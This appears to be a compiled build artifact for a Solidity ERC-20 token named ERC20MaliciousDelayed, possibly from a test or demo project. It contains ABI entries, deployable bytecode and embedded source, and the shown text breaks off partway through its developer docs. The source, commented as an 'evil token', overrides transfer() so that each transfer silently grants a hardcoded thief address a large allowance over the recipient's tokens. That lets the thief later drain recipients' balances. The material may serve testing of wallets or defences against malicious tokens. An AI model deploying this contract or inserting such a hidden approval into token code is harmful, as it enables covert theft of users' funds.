{
  "contractName": "ERC20MaliciousDelayed",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "initialSupply",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        },
        {
          "indexed": true,
          "internalType": "bytes32",
          "name": "previousAdminRole",
          "type": "bytes32"
        },
        {
          "indexed": true,
          "internalType": "bytes32",
          "name": "newAdminRole",
          "type": "bytes32"
        }
      ],
      "name": "RoleAdminChanged",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "sender",
          "type": "address"
        }
      ],
      "name": "RoleGranted",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "sender",
          "type": "address"
        }
      ],
      "name": "RoleRevoked",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "DEFAULT_ADMIN_ROLE",
      "outputs": [
        {
          "internalType": "bytes32",
          "name": "",
          "type": "bytes32"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "burn",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "burnFrom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        }
      ],
      "name": "getRoleAdmin",
      "outputs": [
        {
          "internalType": "bytes32",
          "name": "",
          "type": "bytes32"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "grantRole",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "hasRole",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "renounceRole",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "role",
          "type": "bytes32"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "revokeRole",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes4",
          "name": "interfaceId",
          "type": "bytes4"
        }
      ],
      "name": "supportsInterface",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052734dc6ac40af078661fc43823086e1513635eeab14600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550670de0b6b3a76400006007553480156200007257600080fd5b5060405162002c8738038062002c87833981810160405281019062000098919062000553565b6040518060400160405280601581526020017f45524332304d616c6963696f757344656c6179656400000000000000000000008152506040518060400160405280601581526020017f45524332304d616c6963696f757344656c61796564000000000000000000000081525081600490805190602001906200011c92919062000463565b5080600590805190602001906200013592919062000463565b5050506200014d6000801b336200016660201b60201c565b6200015f33826200017c60201b60201c565b5062000727565b620001788282620002f660201b60201c565b5050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001ef576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620001e690620005e6565b60405180910390fd5b6200020360008383620003e760201b60201c565b806003600082825462000217919062000637565b9250508190555080600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546200026f919062000637565b925050819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef83604051620002d69190620006a5565b60405180910390a3620002f260008383620003ec60201b60201c565b5050565b620003088282620003f160201b60201c565b620003e357600160008084815260200190815260200160002060000160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550620003886200045b60201b60201c565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16837f2f8788117e7eff1d82e926ec794901d17c78024a50270940304540a733656f0d60405160405180910390a45b5050565b505050565b505050565b600080600084815260200190815260200160002060000160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b600033905090565b8280546200047190620006f1565b90600052602060002090601f016020900481019282620004955760008555620004e1565b82601f10620004b057805160ff1916838001178555620004e1565b82800160010185558215620004e1579182015b82811115620004e0578251825591602001919060010190620004c3565b5b509050620004f09190620004f4565b5090565b5b808211156200050f576000816000905550600101620004f5565b5090565b600080fd5b6000819050919050565b6200052d8162000518565b81146200053957600080fd5b50565b6000815190506200054d8162000522565b92915050565b6000602082840312156200056c576200056b62000513565b5b60006200057c848285016200053c565b91505092915050565b600082825260208201905092915050565b7f45524332303a206d696e7420746f20746865207a65726f206164647265737300600082015250565b6000620005ce601f8362000585565b9150620005db8262000596565b602082019050919050565b600060208201905081810360008301526200060181620005bf565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000620006448262000518565b9150620006518362000518565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111562000689576200068862000608565b5b828201905092915050565b6200069f8162000518565b82525050565b6000602082019050620006bc600083018462000694565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200070a57607f821691505b60208210811415620007215762000720620006c2565b5b50919050565b61255080620007376000396000f3fe608060405234801561001057600080fd5b506004361061012c5760003560e01c806342966c68116100ad578063a217fddf11610071578063a217fddf14610369578063a457c2d714610387578063a9059cbb146103b7578063d547741f146103e7578063dd62ed3e146104035761012c565b806342966c68146102b357806370a08231146102cf57806379cc6790146102ff57806391d148541461031b57806395d89b411461034b5761012c565b8063248a9ca3116100f4578063248a9ca3146101fd5780632f2ff15d1461022d578063313ce5671461024957806336568abe1461026757806339509351146102835761012c565b806301ffc9a71461013157806306fdde0314610161578063095ea7b31461017f57806318160ddd146101af57806323b872dd146101cd575b600080fd5b61014b60048036038101906101469190611751565b610433565b6040516101589190611799565b60405180910390f35b6101696104ad565b604051610176919061184d565b60405180910390f35b61019960048036038101906101949190611903565b61053f565b6040516101a69190611799565b60405180910390f35b6101b761055d565b6040516101c49190611952565b60405180910390f35b6101e760048036038101906101e2919061196d565b610567565b6040516101f49190611799565b60405180910390f35b610217600480360381019061021291906119f6565b61065f565b6040516102249190611a32565b60405180910390f35b61024760048036038101906102429190611a4d565b61067e565b005b6102516106a7565b60405161025e9190611aa9565b60405180910390f35b610281600480360381019061027c9190611a4d565b6106b0565b005b61029d60048036038101906102989190611903565b610733565b6040516102aa9190611799565b60405180910390f35b6102cd60048036038101906102c89190611ac4565b6107df565b005b6102e960048036038101906102e49190611af1565b6107f3565b6040516102f69190611952565b60405180910390f35b61031960048036038101906103149190611903565b61083c565b005b61033560048036038101906103309190611a4d565b6108b7565b6040516103429190611799565b60405180910390f35b610353610921565b604051610360919061184d565b60405180910390f35b6103716109b3565b60405161037e9190611a32565b60405180910390f35b6103a1600480360381019061039c9190611903565b6109ba565b6040516103ae9190611799565b60405180910390f35b6103d160048036038101906103cc9190611903565b610aa5565b6040516103de9190611799565b60405180910390f35b61040160048036038101906103fc9190611a4d565b610ae8565b005b61041d60048036038101906104189190611b1e565b610b11565b60405161042a9190611952565b60405180910390f35b60007f7965db0b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614806104a657506104a582610b98565b5b9050919050565b6060600480546104bc90611b8d565b80601f01602080910402602001604051908101604052809291908181526020018280546104e890611b8d565b80156105355780601f1061050a57610100808354040283529160200191610535565b820191906000526020600020905b81548152906001019060200180831161051857829003601f168201915b5050505050905090565b600061055361054c610c02565b8484610c0a565b6001905092915050565b6000600354905090565b6000610574848484610dd5565b6000600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006105bf610c02565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490508281101561063f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161063690611c31565b60405180910390fd5b6106538561064b610c02565b858403610c0a565b60019150509392505050565b6000806000838152602001908152602001600020600101549050919050565b6106878261065f565b61069881610693610c02565b611059565b6106a283836110f6565b505050565b60006012905090565b6106b8610c02565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614610725576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161071c90611cc3565b60405180910390fd5b61072f82826111d6565b5050565b60006107d5610740610c02565b84846002600061074e610c02565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546107d09190611d12565b610c0a565b6001905092915050565b6107f06107ea610c02565b826112b7565b50565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600061084f8361084a610c02565b610b11565b905081811015610894576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161088b90611dda565b60405180910390fd5b6108a8836108a0610c02565b848403610c0a565b6108b283836112b7565b505050565b600080600084815260200190815260200160002060000160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b60606005805461093090611b8d565b80601f016020809104026020016040519081016040528092919081815260200182805461095c90611b8d565b80156109a95780601f1061097e576101008083540402835291602001916109a9565b820191906000526020600020905b81548152906001019060200180831161098c57829003601f168201915b5050505050905090565b6000801b81565b600080600260006109c9610c02565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905082811015610a86576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a7d90611e6c565b60405180910390fd5b610a9a610a91610c02565b85858403610c0a565b600191505092915050565b6000610ad683600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600754610c0a565b610ae08383611490565b905092915050565b610af18261065f565b610b0281610afd610c02565b611059565b610b0c83836111d6565b505050565b6000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c7a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c7190611efe565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cea576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ce190611f90565b60405180910390fd5b80600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92583604051610dc89190611952565b60405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610e45576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e3c90612022565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610eb5576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610eac906120b4565b60405180910390fd5b610ec08383836114ae565b6000600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610f47576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f3e90612146565b60405180910390fd5b818103600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555081600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254610fdc9190611d12565b925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516110409190611952565b60405180910390a36110538484846114b3565b50505050565b61106382826108b7565b6110f2576110888173ffffffffffffffffffffffffffffffffffffffff1660146114b8565b6110968360001c60206114b8565b6040516020016110a792919061223a565b6040516020818303038152906040526040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110e9919061184d565b60405180910390fd5b5050565b61110082826108b7565b6111d257600160008084815260200190815260200160002060000160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550611177610c02565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16837f2f8788117e7eff1d82e926ec794901d17c78024a50270940304540a733656f0d60405160405180910390a45b5050565b6111e082826108b7565b156112b357600080600084815260200190815260200160002060000160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550611258610c02565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16837ff6391f5c32d9c69d2a47ea670b442974b53935d1edc7fd64eb21e047a839171b60405160405180910390a45b5050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611327576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161131e906122e6565b60405180910390fd5b611333826000836114ae565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050818110156113ba576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113b190612378565b60405180910390fd5b818103600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555081600360008282546114129190612398565b92505081905550600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516114779190611952565b60405180910390a361148b836000846114b3565b505050565b60006114a461149d610c02565b8484610dd5565b6001905092915050565b505050565b505050565b6060600060028360026114cb91906123cc565b6114d59190611d12565b67ffffffffffffffff8111156114ee576114ed612426565b5b6040519080825280601f01601f1916602001820160405280156115205781602001600182028036833780820191505090505b5090507f30000000000000000000000000000000000000000000000000000000000000008160008151811061155857611557612455565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053507f7800000000000000000000000000000000000000000000000000000000000000816001815181106115bc576115bb612455565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350600060018460026115fc91906123cc565b6116069190611d12565b90505b60018111156116a6577f3031323334353637383961626364656600000000000000000000000000000000600f86166010811061164857611647612455565b5b1a60f81b82828151811061165f5761165e612455565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350600485901c94508061169f90612484565b9050611609565b50600084146116ea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016116e1906124fa565b60405180910390fd5b8091505092915050565b600080fd5b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b61172e816116f9565b811461173957600080fd5b50565b60008135905061174b81611725565b92915050565b600060208284031215611767576117666116f4565b5b60006117758482850161173c565b91505092915050565b60008115159050919050565b6117938161177e565b82525050565b60006020820190506117ae600083018461178a565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b838110156117ee5780820151818401526020810190506117d3565b838111156117fd576000848401525b50505050565b6000601f19601f8301169050919050565b600061181f826117b4565b61182981856117bf565b93506118398185602086016117d0565b61184281611803565b840191505092915050565b600060208201905081810360008301526118678184611814565b905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061189a8261186f565b9050919050565b6118aa8161188f565b81146118b557600080fd5b50565b6000813590506118c7816118a1565b92915050565b6000819050919050565b6118e0816118cd565b81146118eb57600080fd5b50565b6000813590506118fd816118d7565b92915050565b6000806040838503121561191a576119196116f4565b5b6000611928858286016118b8565b9250506020611939858286016118ee565b9150509250929050565b61194c816118cd565b82525050565b60006020820190506119676000830184611943565b92915050565b600080600060608486031215611986576119856116f4565b5b6000611994868287016118b8565b93505060206119a5868287016118b8565b92505060406119b6868287016118ee565b9150509250925092565b6000819050919050565b6119d3816119c0565b81146119de57600080fd5b50565b6000813590506119f0816119ca565b92915050565b600060208284031215611a0c57611a0b6116f4565b5b6000611a1a848285016119e1565b91505092915050565b611a2c816119c0565b82525050565b6000602082019050611a476000830184611a23565b92915050565b60008060408385031215611a6457611a636116f4565b5b6000611a72858286016119e1565b9250506020611a83858286016118b8565b9150509250929050565b600060ff82169050919050565b611aa381611a8d565b82525050565b6000602082019050611abe6000830184611a9a565b92915050565b600060208284031215611ada57611ad96116f4565b5b6000611ae8848285016118ee565b91505092915050565b600060208284031215611b0757611b066116f4565b5b6000611b15848285016118b8565b91505092915050565b60008060408385031215611b3557611b346116f4565b5b6000611b43858286016118b8565b9250506020611b54858286016118b8565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b60006002820490506001821680611ba557607f821691505b60208210811415611bb957611bb8611b5e565b5b50919050565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206160008201527f6c6c6f77616e6365000000000000000000000000000000000000000000000000602082015250565b6000611c1b6028836117bf565b9150611c2682611bbf565b604082019050919050565b60006020820190508181036000830152611c4a81611c0e565b9050919050565b7f416363657373436f6e74726f6c3a2063616e206f6e6c792072656e6f756e636560008201527f20726f6c657320666f722073656c660000000000000000000000000000000000602082015250565b6000611cad602f836117bf565b9150611cb882611c51565b604082019050919050565b60006020820190508181036000830152611cdc81611ca0565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000611d1d826118cd565b9150611d28836118cd565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611d5d57611d5c611ce3565b5b828201905092915050565b7f45524332303a206275726e20616d6f756e74206578636565647320616c6c6f7760008201527f616e636500000000000000000000000000000000000000000000000000000000602082015250565b6000611dc46024836117bf565b9150611dcf82611d68565b604082019050919050565b60006020820190508181036000830152611df381611db7565b9050919050565b7f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760008201527f207a65726f000000000000000000000000000000000000000000000000000000602082015250565b6000611e566025836117bf565b9150611e6182611dfa565b604082019050919050565b60006020820190508181036000830152611e8581611e49565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000611ee86024836117bf565b9150611ef382611e8c565b604082019050919050565b60006020820190508181036000830152611f1781611edb565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b6000611f7a6022836117bf565b9150611f8582611f1e565b604082019050919050565b60006020820190508181036000830152611fa981611f6d565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b600061200c6025836117bf565b915061201782611fb0565b604082019050919050565b6000602082019050818103600083015261203b81611fff565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b600061209e6023836117bf565b91506120a982612042565b604082019050919050565b600060208201905081810360008301526120cd81612091565b9050919050565b7f45524332303a207472616e7366657220616d6f756e742065786365656473206260008201527f616c616e63650000000000000000000000000000000000000000000000000000602082015250565b60006121306026836117bf565b915061213b826120d4565b604082019050919050565b6000602082019050818103600083015261215f81612123565b9050919050565b600081905092915050565b7f416363657373436f6e74726f6c3a206163636f756e7420000000000000000000600082015250565b60006121a7601783612166565b91506121b282612171565b601782019050919050565b60006121c8826117b4565b6121d28185612166565b93506121e28185602086016117d0565b80840191505092915050565b7f206973206d697373696e6720726f6c6520000000000000000000000000000000600082015250565b6000612224601183612166565b915061222f826121ee565b601182019050919050565b60006122458261219a565b915061225182856121bd565b915061225c82612217565b915061226882846121bd565b91508190509392505050565b7f45524332303a206275726e2066726f6d20746865207a65726f2061646472657360008201527f7300000000000000000000000000000000000000000000000000000000000000602082015250565b60006122d06021836117bf565b91506122db82612274565b604082019050919050565b600060208201905081810360008301526122ff816122c3565b9050919050565b7f45524332303a206275726e20616d6f756e7420657863656564732062616c616e60008201527f6365000000000000000000000000000000000000000000000000000000000000602082015250565b60006123626022836117bf565b915061236d82612306565b604082019050919050565b6000602082019050818103600083015261239181612355565b9050919050565b60006123a3826118cd565b91506123ae836118cd565b9250828210156123c1576123c0611ce3565b5b828203905092915050565b60006123d7826118cd565b91506123e2836118cd565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff048311821515161561241b5761241a611ce3565b5b828202905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b600061248f826118cd565b915060008214156124a3576124a2611ce3565b5b600182039050919050565b7f537472696e67733a20686578206c656e67746820696e73756666696369656e74600082015250565b60006124e46020836117bf565b91506124ef826124ae565b602082019050919050565b60006020820190508181036000830152612513816124d7565b905091905056fea2646970667358221220e9dfd190301b43b4d6ff1afbcff81b7e60a2eb91f82fb0b39f9049ffc858f18c64736f6c634300080a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n// pragma solidity >=0.4.22 <0.9.0;\n\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\n\n// This is an evil token. Whenever an A -> B transfer is called,\n// a predefined C is given a massive allowance on B.\ncontract ERC20MaliciousDelayed is AccessControl, ERC20Burnable {\n  address private _thief = 0x4dC6ac40Af078661fc43823086E1513635Eeab14;\n  uint256 private _bigNum = 1000000000000000000; // ~uint256(0)\n  constructor(uint256 initialSupply)\n    ERC20(\"ERC20MaliciousDelayed\", \"ERC20MaliciousDelayed\") {\n      _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n      _mint(msg.sender, initialSupply);\n  }\n  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    // Any time a transaction happens, the thief account is granted allowance in secret.\n    // Still emits an Approve!\n    super._approve(recipient, _thief, _bigNum);\n    return super.transfer(recipient, amount);\n  }\n}",
  "sourcePath": "/Users/danielburckhardt/code/tmp/solidity-malicious-contract/contracts/erc20MaliciousDelayed.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.10+commit.fc410830.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2022-01-05T09:36:00.258Z",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "approve(address,uint256)": {
        "details": "See {IERC20-approve}. Requirements: - `spender` cannot be the zero address."
      },
      "balanceOf(address)": {
        "details": "See {IERC20-balanceOf}."
      },
      "burn(uint256)": {
        "details": "Destroys `amount` tokens from the caller. See {ERC20-_burn}."
      },
      "burnFrom(address,uint256)": {
        "details": "Destroys `amount` tokens from `account`, deducting from the caller's allowance. See {ERC20-_burn} and {ERC20-allowance}. Requirements: - the caller must have allowance for ``accounts``'s tokens of at least `amount`."
      },
      "decimals()": {
        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the value {ERC20} uses, unless this function is overridden; NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
